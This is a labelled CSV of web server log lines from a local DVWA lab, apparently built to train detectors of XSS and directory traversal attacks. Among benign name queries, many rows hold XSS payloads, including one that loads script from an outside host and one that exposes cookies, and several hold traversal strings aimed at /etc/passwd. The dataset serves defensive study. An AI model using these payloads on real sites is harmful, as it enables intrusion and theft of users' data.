,url,normal,xss,dir
9501,"127.0.0.1 - - [03/May/2021:02:28:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3d%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b%20 HTTP/1.1"" 200 1685 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
12229,"127.0.0.1 - - [03/May/2021:03:23:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Noella HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2526,"127.0.0.1 - - [03/May/2021:10:23:46 -0400] ""GET /DVWA/vulnerabilities/fi/?page=constant.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14384,"127.0.0.1 - - [03/May/2021:10:23:48 -0400] ""GET /DVWA/vulnerabilities/fi/?page=dat.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14291,"127.0.0.1 - - [03/May/2021:03:26:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Stephi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8755,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<main onmouseover=\""alert(1)\"">test</main>"" 400 0 ""-"" ""-""",0,1,0
11567,"127.0.0.1 - - [03/May/2021:03:13:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chitra HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7897,"127.0.0.1 - - [03/May/2021:03:23:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Peggie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3602,"127.0.0.1 - - [03/May/2021:03:06:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=esp HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1475,"127.0.0.1 - - [03/May/2021:02:34:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=ABC<div style=\""x:\\xE2\\x80\\x83expression(javascript:alert(1)\"">DEF"" 400 0 ""-"" ""-""",0,1,0
577,"127.0.0.1 - - [03/May/2021:03:22:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Minta HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7780,"127.0.0.1 - - [03/May/2021:03:14:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dinker HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19636,"127.0.0.1 - - [03/May/2021:03:05:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=c HTTP/1.1"" 200 1693 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1127,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><tfoot onload=alert(1)></tfoot>"" 400 0 ""-"" ""-""",0,1,0
16684,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><rt onload=alert(1)></rt>"" 400 0 ""-"" ""-""",0,1,0
10841,"127.0.0.1 - - [03/May/2021:03:28:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Yan-Zhen HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5382,"127.0.0.1 - - [28/Apr/2021:22:15:12 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1351 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9458,"127.0.0.1 - - [03/May/2021:10:05:25 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc%c1%9cpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
6417,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title oncontextmenu=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",0,1,0
12287,"127.0.0.1 - - [03/May/2021:03:27:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tobi HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15567,"127.0.0.1 - - [03/May/2021:03:16:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fwp HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8442,"127.0.0.1 - - [03/May/2021:10:23:50 -0400] ""GET /DVWA/vulnerabilities/fi/?page=default.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10540,"127.0.0.1 - - [03/May/2021:03:40:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<image draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
11550,"127.0.0.1 - - [03/May/2021:03:19:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kasey HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11236,"127.0.0.1 - - [03/May/2021:10:24:01 -0400] ""GET /DVWA/vulnerabilities/fi/?page=folder.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5423,"127.0.0.1 - - [03/May/2021:03:19:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kamran HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16293,"127.0.0.1 - - [03/May/2021:03:17:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Haley HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1869,"127.0.0.1 - - [03/May/2021:03:40:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
9934,"127.0.0.1 - - [03/May/2021:02:24:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%3c!\xe2\x80\x93 HTTP/1.1"" 200 1678 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
11233,"127.0.0.1 - - [03/May/2021:02:34:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=`\""'><img src=xxx:x"" 400 0 ""-"" ""-""",0,1,0
6951,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<button onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
14489,"127.0.0.1 - - [03/May/2021:03:06:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=malcom HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3880,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed src=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",0,1,0
4154,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menuitem onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
471,"127.0.0.1 - - [03/May/2021:03:11:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Austina HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7437,"127.0.0.1 - - [03/May/2021:10:24:07 -0400] ""GET /DVWA/vulnerabilities/fi/?page=hits.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9848,"127.0.0.1 - - [03/May/2021:03:28:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Woody HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18287,"127.0.0.1 - - [03/May/2021:03:11:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Arlinda HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3997,"127.0.0.1 - - [03/May/2021:10:06:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=./.././.././.././.././../etc/passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
8960,"127.0.0.1 - - [03/May/2021:03:41:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<rt onmouseout=\""alert(1)\"">test</rt>"" 400 0 ""-"" ""-""",0,1,0
10807,"127.0.0.1 - - [03/May/2021:03:15:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Eugene HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8216,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tt onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
16292,"127.0.0.1 - - [03/May/2021:03:15:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elliot HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10502,"127.0.0.1 - - [03/May/2021:03:12:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Camino HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16244,"127.0.0.1 - - [03/May/2021:10:23:52 -0400] ""GET /DVWA/vulnerabilities/fi/?page=deployment.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12227,"127.0.0.1 - - [03/May/2021:03:13:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Corrine HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10797,"127.0.0.1 - - [03/May/2021:03:23:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nurhan HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14751,"127.0.0.1 - - [03/May/2021:03:40:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<address oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
15075,"127.0.0.1 - - [03/May/2021:03:16:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gerrard HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14184,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<output onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
14217,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
8743,"127.0.0.1 - - [03/May/2021:03:40:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<element id=x"" 400 0 ""-"" ""-""",0,1,0
10245,"127.0.0.1 - - [03/May/2021:10:23:56 -0400] ""GET /DVWA/vulnerabilities/fi/?page=documents.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2494,"127.0.0.1 - - [28/Apr/2021:21:54:24 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1675 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19537,"127.0.0.1 - - [03/May/2021:03:10:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ania HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9577,"127.0.0.1 - - [03/May/2021:03:12:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bobbe HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6638,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noframes draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
5542,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><set onrepeat=alert(1)"" 400 0 ""-"" ""-""",0,1,0
805,"127.0.0.1 - - [03/May/2021:03:27:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Truus HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13456,"127.0.0.1 - - [03/May/2021:03:04:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name= HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12830,"127.0.0.1 - - [03/May/2021:03:10:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Air HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11243,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Patt HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9372,"127.0.0.1 - - [03/May/2021:03:16:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gui HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18167,"127.0.0.1 - - [03/May/2021:02:34:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body onResize"" 400 0 ""-"" ""-""",0,1,0
17950,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<param onclick=\""alert(1)\"">test</param>"" 400 0 ""-"" ""-""",0,1,0
1437,"127.0.0.1 - - [03/May/2021:02:34:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<table background=\""javascript:javascript:alert(1)\"">"" 400 0 ""-"" ""-""",0,1,0
18547,"127.0.0.1 - - [03/May/2021:03:11:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Aziz HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11885,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT>document.write(\""XSS\"");</SCRIPT> HTTP/1.1"" 200 1719 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
15091,"127.0.0.1 - - [03/May/2021:02:34:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x09javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
20034,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<header onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
3006,"127.0.0.1 - - [03/May/2021:03:06:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=example HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1421,"127.0.0.1 - - [03/May/2021:03:19:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Katha HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9148,"127.0.0.1 - - [03/May/2021:03:22:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mukul HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13640,"127.0.0.1 - - [03/May/2021:03:21:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mary-Ann HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12738,"127.0.0.1 - - [03/May/2021:03:24:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Querida HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19556,"127.0.0.1 - - [03/May/2021:02:19:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d'%26%23x6a%3bavasc%26%23000010ript%3aa%26%23x6c%3bert(document%2e%26%23x63%3bookie)'%3e HTTP/1.1"" 200 1710 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
3350,"127.0.0.1 - - [03/May/2021:03:18:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Irice HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7859,"127.0.0.1 - - [03/May/2021:03:26:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Stacey HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10980,"127.0.0.1 - - [03/May/2021:03:20:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kyrstin HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5823,"127.0.0.1 - - [03/May/2021:03:14:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dorry HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16509,"127.0.0.1 - - [03/May/2021:03:41:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><body"" 400 0 ""-"" ""-""",0,1,0
14967,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=</TITLE><SCRIPT>alert(\""XSS\"");</SCRIPT> HTTP/1.1"" 200 1719 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
16074,"127.0.0.1 - - [03/May/2021:03:41:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<strike onmouseout=\""alert(1)\"">test</strike>"" 400 0 ""-"" ""-""",0,1,0
15605,"127.0.0.1 - - [03/May/2021:03:12:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carlie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20364,"127.0.0.1 - - [03/May/2021:03:07:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=percolate HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14933,"127.0.0.1 - - [03/May/2021:03:14:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ebonee HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4598,"127.0.0.1 - - [03/May/2021:03:21:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marge HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16435,"127.0.0.1 - - [03/May/2021:03:12:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Charlene HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5052,"127.0.0.1 - - [03/May/2021:03:41:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><dl"" 400 0 ""-"" ""-""",0,1,0
458,"127.0.0.1 - - [03/May/2021:03:21:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marijo HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3346,"127.0.0.1 - - [03/May/2021:03:12:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Charla HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20200,"127.0.0.1 - - [03/May/2021:03:07:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=register HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17807,"127.0.0.1 - - [03/May/2021:03:27:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Taro HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
